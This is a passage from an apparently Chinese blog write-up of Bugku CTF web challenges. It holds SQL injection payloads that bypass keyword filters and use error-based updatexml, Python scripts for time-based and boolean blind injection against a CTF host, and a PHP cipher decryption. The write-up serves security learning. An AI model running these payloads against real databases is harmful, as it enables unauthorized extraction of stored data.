class="keyword">except</span> requests.exceptions.ReadTimeout:  <span class="comment">#超时的操作，超时表示匹配成功</span></span><br><span class="line">                keyword+=str(word)</span><br><span class="line">                <span class="keyword">print</span> str(pos)+<span class="string">'---'</span>+str(word)</span><br><span class="line">                flag=<span class="number">1</span></span><br><span class="line">                flag1=<span class="number">1</span></span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">if</span>(flag==<span class="number">0</span>):</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">print</span> keyword</span><br><span class="line">    <span class="keyword">if</span>(flag1==<span class="number">0</span>):</span><br><span class="line">        <span class="keyword">break</span></span><br></pre></td></tr></table></figure><p>爆flag</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line">import requests</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">words=&apos;1234567890!@$%^&amp;*()_+=-|&#125;&#123;POIUYTREWQASDFGHJKL:?&gt;&lt;MNBVCXZqwertyuiop[];lkjhgfdsazxcvbnm,./`~&apos;</span><br><span class="line">url=&apos;http://120.24.86.145:8002/web15/&apos;</span><br><span class="line">s=requests.Session()</span><br><span class="line"></span><br><span class="line">keyword=&apos;&apos;</span><br><span class="line"></span><br><span class="line">for i in range(100):</span><br><span class="line">    keyword=&apos;&apos;</span><br><span class="line">    flag1=0</span><br><span class="line">    for pos in range(1,100):    #设长度小于100</span><br><span class="line">        flag=0</span><br><span class="line">        for word in words:</span><br><span class="line">            try:</span><br><span class="line">                headers=&#123;&apos;X-Forwarded-For&apos;:&quot;1&apos;+(select case when (substring((select flag from flag limit 1 offset &quot;+str(i)+&quot;) from &quot;+str(pos)+&quot; for 1)=&apos;&quot;+str(word)+&quot;&apos;) then sleep(5) else 1 end) and &apos;1&quot;&#125;</span><br><span class="line">                r=s.get(url,headers=headers,timeout=4)</span><br><span class="line">                #print r.text</span><br><span class="line">            except requests.exceptions.ReadTimeout:  #超时的操作，超时表示匹配成功</span><br><span class="line">                keyword+=str(word)</span><br><span class="line">                print str(pos)+&apos;---&apos;+str(word)</span><br><span class="line">                flag=1</span><br><span class="line">                flag1=1</span><br><span class="line">                break</span><br><span class="line">        if(flag==0):</span><br><span class="line">            break</span><br><span class="line">    print keyword</span><br><span class="line">    if(flag1==0):</span><br><span class="line">        break</span><br></pre></td></tr></table></figure><h2 id="这是一个神奇的登陆框-注入"><a href="#这是一个神奇的登陆框-注入" class="headerlink" title="这是一个神奇的登陆框-注入"></a>这是一个神奇的登陆框-注入</h2><p>可以看到源码</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">div</span> &gt;</span></span><br><span class="line"><span class="comment">&lt;!-- UserName : --&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">input</span> <span class="attr">class</span>=<span class="string">"op"</span> <span class="attr">type</span>=<span class="string">"text"</span>  <span class="attr">name</span>=<span class="string">"admin_name"</span> <span class="attr">value</span>=<span class="string">""</span> <span class="attr">placeholder</span>=<span class="string">"Username"</span>/&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">style</span>=<span class="string">"margin-top:15px;"</span>&gt;</span></span><br><span class="line"><span class="comment">&lt;!-- PassWord : --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">class</span>=<span class="string">"op"</span> <span class="attr">type</span>=<span class="string">"password"</span> <span class="attr">name</span>=<span class="string">"admin_passwd"</span> <span class="attr">value</span>=<span class="string">""</span> <span class="attr">placeholder</span>=<span class="string">"Password"</span>/&gt;</span></span><br><span class="line"><span class="comment">&lt;!--**************************************--&gt;</span></span><br><span class="line"><span class="comment">&lt;!--23333--&gt;</span></span><br><span class="line"><span class="comment">&lt;!--**************************************--&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span><span class="tag">&lt;/<span class="name">br</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">style</span>=<span class="string">" margin-top:-11px;"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">class</span>=<span class="string">"login"</span> <span class="attr">type</span>=<span class="string">"submit"</span> <span class="attr">name</span>=<span class="string">"submit"</span> <span class="attr">value</span>=<span class="string">"GO GO GO"</span> /&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br></pre></td></tr></table></figure><p>先是输入<code>1&#39;</code>，然而却还是一样，重新输入<code>1&quot;</code>后发现居然会报错，那么可以确定可以注入，而且使用<code>&quot;</code>来闭合的。然后再输入<code>1&quot; or 1=1 #</code>，有回显，那么就简单了。</p><p>输入<code>1&quot; order by 3 #</code>，发现报错，那么查询只有两个值。</p><p>现在来获得数据库的名字<code>-1&quot; union select database(),1 #</code>，当前数据库为<code>bugkusql1</code>。</p><p>然后再获取表名<code>-1&quot; union select concat(table_name),1 from information_schema.tables where table_schema=&#39;bugkusql1&#39; #</code>得到表名为flag1。</p><p>最后来获取列名<code>-1&quot; union select concat(column_name),1 from information_schema.columns where table_schema=&#39;bugkusql1&#39; and table_name=&#39;flag1&#39; #</code>得到列名为flag1。</p><p>知道表名和列名直接<code>-1&quot; union select flag1,1 from flag1 #</code>，即可获得flag。</p><p>也可以使用sqlmap来进行暴库，详情见<code>https://blog.csdn.net/qq_38412357/article/details/79559039</code></p><h2 id="多次-注入"><a href="#多次-注入" class="headerlink" title="多次-注入"></a>多次-注入</h2><p>这一题真好玩，打开后，看见url的<code>id=1</code>，那就输入几个id试试，当<code>id=5</code>的时候说可以注入，那id应该就是注入点了，输入<code>id=1&#39;</code>，发现报错error。</p><p>再次输入<code>id=1&#39; #</code>发现还是报错，猜是过滤了<code>#</code>，试一下输入<code>id=1&#39; %23</code>，发现正常。</p><p>然后输入<code>id=1&#39; and 1=1 %23</code>，发现出错了，那应该是过滤了部分单词，那么就要试出过滤了什么。</p><p>首先是输入<code>id=1&#39;^1 %23</code>，结果为0，那么按理报错，若是报错，再输入<code>id=1&#39;^0 %23</code>，结果为1，要是不报错，则说明这方法可以用。这里利用的就是异或。</p><p>然后开始来尝试看看有哪些关键字被过滤了，构造的payload为<code>id=1&#39;^(length(&#39;and&#39;)!=0) %23</code>,当关键字被过滤，长度则为0，那么应该正常输出。要是报错则说明没有被过滤。</p><p>可以试出来有被过滤的有<code>and,or,union,select</code>，没有被过滤的为 <code>concat,from,where,order,by</code>。</p><p>我们可以再次输入<code>id=1&#39;^(length(&#39;anandd&#39;)!=0) %23</code>，来判断是否是只过滤了一次，要是报错，则是只过滤了一次，就简单了。测试说明是对的，所以剩下的就是暴库了。</p><p>回想起之前输入不同的id有不同的回显，那么应该是有回显的注入，输入<code>id=-1&#39; ununionion selselectect 1,database() %23</code>，发现数据库的名字为<code>web1002-1</code>，剩下的就简单了个屁呀。</p><p>注：<code>information</code>里面也有<code>or</code>，所以应该是<code>infroorrmation</code>，日了。</p><p>然后获得表名<code>-1&#39; ununionion selselectect 1,table_name from infoorrmation_schema.tables where table_schema=database() %23</code>，发现表名为flag1。</p><p>然后获取列名<code>-1&#39; ununionion selselectect 1,column_name from infoorrmation_schema.columns where table_schema=database() anandd table_name=&#39;flag1&#39; %23</code>，发现列名为flag1。</p><p>剩下直接就搜索了<code>id=-1&#39; ununionion selselectect 1,flag1 from flag1 %23</code>，得到了flag：<code>usOwycTju+FTUUzXosjr</code>，然而说有两个flag，所以继续在库里加油。</p><p>可以跳过下面这里，原来是flag1表里有多个列，蠢了：</p><p>构造payload来获取当前的数据库<code>-1&#39; ununionion selselectect 1,group_concat(table_name) from infoorrmation_schema.tables where table_schema=database() %23</code>，发现有另外一个表：<code>hint</code>。</p><p>那么就获取hint表的列名<code>id=-1&#39; ununionion selselectect 1,group_concat(column_name) from infoorrmation_schema.columns where table_schema=database() anandd table_name=&#39;hint&#39; %23</code>，发现有两列，<code>id</code>和<code>contents</code>。</p><p>剩下就搜索了，然而发现这个就是我们之前web显示的内容。。。</p><p>那重来，构造payload来获取所有的数据库<code>-1&#39; ununionion selselectect 1,group_concat(table_name) from infoorrmation_schema.tables %23</code>发现表一共有：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">character_sets,collations,collation_character_set_applicability,columns,column_privileges,engines,events,files,global_status,global_variables,key_column_usage,parameters,partitions,plugins,processlist,profiling,referential_constraints,routines,schemata,schema_privileges,session_status,session_variables,statistics,tables,tablespaces,table_constraints,table_privileges,triggers,user_privileges,views,innodb_buffer_page,innodb_trx,innodb_buffer_pool_stats,innodb_lock_waits,innodb_cmpmem,innodb_cmp,innodb_locks,innodb_cmpmem_reset,innodb_cmp_reset,innodb_buffer_page_lru,flag1,hint</span><br></pre></td></tr></table></figure><p>没有什么特殊的表，忽然想到应该是flag1表里有多列，输入<code>-1&#39; ununionion selselectect 1,group_concat(column_name) from infoorrmation_schema.columns where table_schema=database() anandd table_name=&#39;flag1&#39; %23</code>，发现还有一列<code>address</code>。</p><p>然后重新输入<code>-1&#39; ununionion selselectect 1,group_concat(address) from flag1 %23</code>，获得下一关地址。</p><p>和之前的操作一样试了试，感觉都差不多，都有过滤，而且有回显我的输入，所以很好判断过滤了什么。</p><p>过滤的：<code>union，sleep，substr</code>，而且不是之前那种只过滤了一次，要用别的方法来绕过。</p><p>然而百度后，有两种方法可以做：</p><p>法一：</p><p>UpdateXml，mysql基于错误回显的注入：<code>https://www.cnblogs.com/MiWhite/p/6228491.html</code>和<code>https://blog.csdn.net/m0_37438418/article/details/80260813</code></p><p>相应的wp：<code>https://blog.csdn.net/u011377996/article/details/79340100#t17</code></p><p>总结一下，构造的payload类似<code>1&#39; and updatexml(1,concat(1,database()),1) %23</code></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">UPDATEXML (XML_document, XPath_string, new_value); </span><br><span class="line">第一个参数：XML_document是String格式，为XML文档对象的名称，文中为Doc </span><br><span class="line">第二个参数：XPath_string (Xpath格式的字符串) ，如果不了解Xpath语法，可以在网上查找教程。 </span><br><span class="line">第三个参数：new_value，String格式，替换查找到的符合条件的数据 </span><br><span class="line">作用：改变文档中符合条件的节点的值</span><br></pre></td></tr></table></figure><p>使用updataxml这个函数，然而第二个参数要求是Xpath类型的变量。而concat(x1,x2)函数返回的字符串，不符合条件，所以会报错。顺便一提的是这里payload的1都是随意的，任意值均可，毕竟本来就是基于报错的。（这个是个设想，在本题是这样的，还不清楚别的怎么样）</p><p>因为本次注入有错误提示，所以我们可以基于错误的注入：</p><p>首先是数据库名字：<code>1&#39; and updatexml(1,concat(1,database()),1) %23</code></p><p>然后是表名：<code>1&#39; and updatexml(1,concat(1,(select group_concat(table_name) from information_schema.tables where table_schema=database())),1) %23</code>,注意，select这个短语要括起来，要不会报错。现在爆出表名<code>class,flag2</code>。</p><p>再去flag2爆出列<code>1&#39; and updatexml(1,concat(1,(select group_concat(column_name) from information_schema.columns where table_schema=database() and table_name=&#39;flag2&#39;)),1) %23</code>，爆出列为<code>flag2,address</code>。</p><p>最后就简单了：<code>1&#39; and updatexml(1,concat(1,(select group_concat(flag2) from flag2)),1) %23</code>，成功爆出flag，记得是全部小写。</p><p>法二：</p><p>相应wp：<code>https://www.cnblogs.com/nienie/p/8524519.html</code></p><p>所构造的payload为<code>url = &quot;http://120.24.86.145:9004/Once_More.php?id=1&#39;and  (select locate(binary&#39;&quot; + str(i) + &quot;&#39;,(select table_name from information_schema.tables where table_schema=database() limit 0,1),&quot; + str(j) + &quot;))=&quot; + str(j) + &quot;%23&quot;</code></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">LOCATE(substr,str)</span><br><span class="line">POSITION(substr IN str)</span><br><span class="line">返回子串 substr 在字符串 str 中第一次出现的位置。如果子串 substr 在 str 中不存在，返回值为 0：</span><br><span class="line"></span><br><span class="line">LOCATE(substr,str,pos)</span><br><span class="line">指定其实位置：</span><br><span class="line">SELECT LOCATE(&apos;bar&apos;, &apos;foobarbar&apos;,5);  --&gt; 7 (从foobarbar的第五个位置开始查找)</span><br><span class="line"></span><br><span class="line">BINARY不是函数，是类型转换运算符，它用来强制它后面的字符串为一个二进制字符串，可以理解为在字符串比较的时候区分大小写</span><br><span class="line">如下：</span><br><span class="line">mysql&gt; select binary &apos;ABCD&apos;=&apos;abcd&apos; COM1, &apos;ABCD&apos;=&apos;abcd&apos; COM2;</span><br><span class="line">+--------+-----------+</span><br><span class="line">| COM1 | COM2 |</span><br><span class="line">+--------+-----------+</span><br><span class="line">|      0     |      1      |</span><br><span class="line">+---------+-----------+</span><br><span class="line">1 row in set (0.00 sec)</span><br></pre></td></tr></table></figure><p>翻译过来的语句如下：</p><p><code>(select locate(binary&#39;word&#39;,(select table_name from information_schema.tables where table_schema=database() limit 0,1),postion))=postion#</code></p><p>总的意思是先用里面select返回语句，然后用locate来判断某个字符是否在其中，在的话返回位置。</p><p>然后剩下的只要py即可：</p><p>首先是爆数据库的表名：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">words=<span class="string">'1234567890!@$%^&amp;*()_+=-|&#125;&#123;POIU YTREWQASDFGHJKL:?&gt;&lt;MNBVCXZqwertyuiop[];lkjhgfdsazxcvbnm,./`~'</span></span><br><span class="line">url=<span class="string">'http://120.24.86.145:9004/Once_More.php'</span></span><br><span class="line">s=requests.Session()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">100</span>):</span><br><span class="line">    zzz=<span class="number">0</span></span><br><span class="line">    keyword=<span class="string">''</span></span><br><span class="line">    <span class="keyword">print</span> <span class="string">'====================================================================='</span></span><br><span class="line">    <span class="keyword">for</span> pos <span class="keyword">in</span> range(<span class="number">1</span>,<span class="number">100</span>):</span><br><span class="line">        flag=<span class="number">0</span></span><br><span class="line">        <span class="keyword">for</span> word <span class="keyword">in</span> words:</span><br><span class="line">            sql=url+<span class="string">"?id=1' and (select locate(binary'"</span>+str(word)+<span class="string">"',(select table_name from information_schema.tables where table_schema=database() limit "</span>+str(i)+<span class="string">",1),"</span>+str(pos)+<span class="string">"))="</span>+str(pos)+<span class="string">" %23"</span></span><br><span class="line">            r=s.get(sql)</span><br><span class="line">            <span class="keyword">if</span> <span class="string">'Hello'</span> <span class="keyword">in</span> r.text:</span><br><span class="line">                flag=<span class="number">1</span></span><br><span class="line">                zzz=<span class="number">1</span></span><br><span class="line">                <span class="keyword">print</span> str(pos)+<span class="string">"----"</span>+str(word)</span><br><span class="line">                keyword+=str(word)</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">if</span>(flag==<span class="number">0</span>):</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">print</span> keyword</span><br><span class="line">    <span class="keyword">if</span>(zzz==<span class="number">0</span>):</span><br><span class="line">        <span class="keyword">break</span></span><br></pre></td></tr></table></figure><p>然后是爆出列名</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">words=<span class="string">'1234567890!@$%^&amp;*()_+=-|&#125;&#123;POIU YTREWQASDFGHJKL:?&gt;&lt;MNBVCXZqwertyuiop[];lkjhgfdsazxcvbnm,./`~'</span></span><br><span class="line">url=<span class="string">'http://120.24.86.145:9004/Once_More.php'</span></span><br><span class="line">s=requests.Session()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">100</span>):</span><br><span class="line">    zzz=<span class="number">0</span></span><br><span class="line">    keyword=<span class="string">''</span></span><br><span class="line">    <span class="keyword">print</span> <span class="string">'====================================================================='</span></span><br><span class="line">    <span class="keyword">for</span> pos <span class="keyword">in</span> range(<span class="number">1</span>,<span class="number">100</span>):</span><br><span class="line">        flag=<span class="number">0</span></span><br><span class="line">        <span class="keyword">for</span> word <span class="keyword">in</span> words:</span><br><span class="line">            sql=url+<span class="string">"?id=1' and (select locate(binary'"</span>+str(word)+<span class="string">"',(select column_name from information_schema.columns where table_schema=database() and table_name='flag2' limit "</span>+str(i)+<span class="string">",1),"</span>+str(pos)+<span class="string">"))="</span>+str(pos)+<span class="string">" %23"</span></span><br><span class="line">            r=s.get(sql)</span><br><span class="line">            <span class="keyword">if</span> <span class="string">'Hello'</span> <span class="keyword">in</span> r.text:</span><br><span class="line">                flag=<span class="number">1</span></span><br><span class="line">                zzz=<span class="number">1</span></span><br><span class="line">                <span class="keyword">print</span> str(pos)+<span class="string">"----"</span>+str(word)</span><br><span class="line">                keyword+=str(word)</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">if</span>(flag==<span class="number">0</span>):</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">print</span> keyword</span><br><span class="line">    <span class="keyword">if</span>(zzz==<span class="number">0</span>):</span><br><span class="line">        <span class="keyword">break</span></span><br></pre></td></tr></table></figure><p>最后是爆出flag</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">words=<span class="string">'1234567890!@$%^&amp;*()_+=-|&#125;&#123;POIU YTREWQASDFGHJKL:?&gt;&lt;MNBVCXZqwertyuiop[];lkjhgfdsazxcvbnm,./`~'</span></span><br><span class="line">url=<span class="string">'http://120.24.86.145:9004/Once_More.php'</span></span><br><span class="line">s=requests.Session()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">100</span>):</span><br><span class="line">    zzz=<span class="number">0</span></span><br><span class="line">    keyword=<span class="string">''</span></span><br><span class="line">    <span class="keyword">print</span> <span class="string">'====================================================================='</span></span><br><span class="line">    <span class="keyword">for</span> pos <span class="keyword">in</span> range(<span class="number">1</span>,<span class="number">100</span>):</span><br><span class="line">        flag=<span class="number">0</span></span><br><span class="line">        <span class="keyword">for</span> word <span class="keyword">in</span> words:</span><br><span class="line">            sql=url+<span class="string">"?id=1' and (select locate(binary'"</span>+str(word)+<span class="string">"',(select flag2 from flag2 limit "</span>+str(i)+<span class="string">",1),"</span>+str(pos)+<span class="string">"))="</span>+str(pos)+<span class="string">" %23"</span></span><br><span class="line">            r=s.get(sql)</span><br><span class="line">            <span class="keyword">if</span> <span class="string">'Hello'</span> <span class="keyword">in</span> r.text:</span><br><span class="line">                flag=<span class="number">1</span></span><br><span class="line">                zzz=<span class="number">1</span></span><br><span class="line">                <span class="keyword">print</span> str(pos)+<span class="string">"----"</span>+str(word)</span><br><span class="line">                keyword+=str(word)</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">if</span>(flag==<span class="number">0</span>):</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">print</span> keyword</span><br><span class="line">    <span class="keyword">if</span>(zzz==<span class="number">0</span>):</span><br><span class="line">        <span class="keyword">break</span></span><br></pre></td></tr></table></figure><h2 id="PHP-encrypt-1-ISCCCTF-代码审计"><a href="#PHP-encrypt-1-ISCCCTF-代码审计" class="headerlink" title="PHP_encrypt_1(ISCCCTF)-代码审计"></a>PHP_encrypt_1(ISCCCTF)-代码审计</h2><p>题目的源码日常不完整，不给加密后的值，拿头做呀</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">encrypt</span><span class="params">($data,$key)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    $key = md5(<span class="string">'ISCC'</span>);</span><br><span class="line">    $x = <span class="number">0</span>;</span><br><span class="line">    $len = strlen($data);</span><br><span class="line">    $klen = strlen($key);</span><br><span class="line">    <span class="keyword">for</span> ($i=<span class="number">0</span>; $i &lt; $len; $i++) &#123;</span><br><span class="line">        <span class="keyword">if</span> ($x == $klen)</span><br><span class="line">        &#123;</span><br><span class="line">            $x = <span class="number">0</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        $char .= $key[$x];</span><br><span class="line">        $x+=<span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span> ($i=<span class="number">0</span>; $i &lt; $len; $i++) &#123;</span><br><span class="line">        $str .= chr((ord($data[$i]) + ord($char[$i])) % <span class="number">128</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> base64_encode($str);</span><br><span class="line">&#125; <span class="meta">?&gt;</span></span><br><span class="line">output: fR4aHWwuFCYYVydFRxMqHhhCKBseH1dbFygrRxIWJ1UYFhotFjA=</span><br></pre></td></tr></table></figure><p>翻译一下，首先是获得了ISCC的md5值，然后从ISCC的md5值取出和所要加密数据一样长的字符作为秘钥，要是ISCC的md5值不够长，那就重复。现在明文和秘钥都有了，依次取这两个的ASCII值，相加后取余128，再变回字符。</p><p>大佬写好的php脚本，基本是直接改了加密的脚本，简洁呀。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">decrypt</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    $key = md5(<span class="string">'ISCC'</span>);</span><br><span class="line">    $data = base64_decode(<span class="string">'fR4aHWwuFCYYVydFRxMqHhhCKBseH1dbFygrRxIWJ1UYFhotFjA='</span>);</span><br><span class="line">    $len = strlen($data);</span><br><span class="line">    $klen = strlen($key);</span><br><span class="line">    <span class="keyword">for</span> ($i=<span class="number">0</span>; $i &lt; $len; $i++) &#123; </span><br><span class="line">        <span class="keyword">if</span> ($x == $klen)</span><br><span class="line">        &#123;</span><br><span class="line">            $x = <span class="number">0</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        $char .= $key[$x];</span><br><span class="line">        $x+=<span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span> ($i=<span class="number">0</span>; $i &lt; $len; $i++) &#123;</span><br><span class="line">        $tmp  = ord($data[$i]) - ord($char[$i]) + <span class="number">128</span>;</span><br><span class="line">        $str .= chr($tmp &gt; <span class="number">128</span> ? $tmp<span class="number">-128</span>:$tmp);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">echo</span> $str;</span><br><span class="line">&#125;</span><br><span class="line">decrypt();</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p><code>Flag:{asdqwdfasfdawfefqwdqwdadwqadawd}</code> </p><h2 id="文件包含2–未完成"><a href="#文件包含2–未完成" class="headerlink" title="文件包含2–未完成"></a>文件包含2–未完成</h2><p>可以使用<code>&lt;script language=php&gt; &lt;/script&gt;</code>标签绕过这个验证 </p><h2 id="flag-php-代码审计"><a href="#flag-php-代码审计" class="headerlink" title="flag.php-代码审计"></a>flag.php-代码审计</h2><p>打开后发现是输入框，然而看了下源码</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;form method=&quot;POST&quot; action=&quot;#&quot;&gt;</span><br><span class="line">  &lt;p&gt;&lt;input name=&quot;user&quot; type=&quot;text&quot; placeholder=&quot;Username&quot;&gt;&lt;/p&gt;</span><br><span class="line">  &lt;p&gt;&lt;input name=&quot;password&quot; type=&quot;password&quot; placeholder=&quot;Password&quot;&gt;&lt;/p&gt;</span><br><span class="line">  &lt;p&gt;&lt;input value=&quot;Login&quot; type=&quot;button&quot;/&gt;&lt;/p&gt;</span><br></pre></td></tr></table></figure><p>这些输入框和按钮都是浮云，没有用的，然后用工具扫半天，啥也没有。百度之后才知道是通过get方法提交一个hint变量，就可以看见源码。payload为：<code>http://120.24.86.145:8002/flagphp/index.php?hint=a</code></p><p>源码如下</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"> <span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">include_once</span>(<span class="string">"flag.php"</span>);</span><br><span class="line">$cookie = $_COOKIE[<span class="string">'ISecer'</span>];</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">'hint'</span>]))&#123;</span><br><span class="line">    show_source(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">elseif</span> (unserialize($cookie) === <span class="string">"$KEY"</span>)</span><br><span class="line">&#123;   </span><br><span class="line">    <span class="keyword">echo</span> <span class="string">"$flag"</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span> &#123;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span 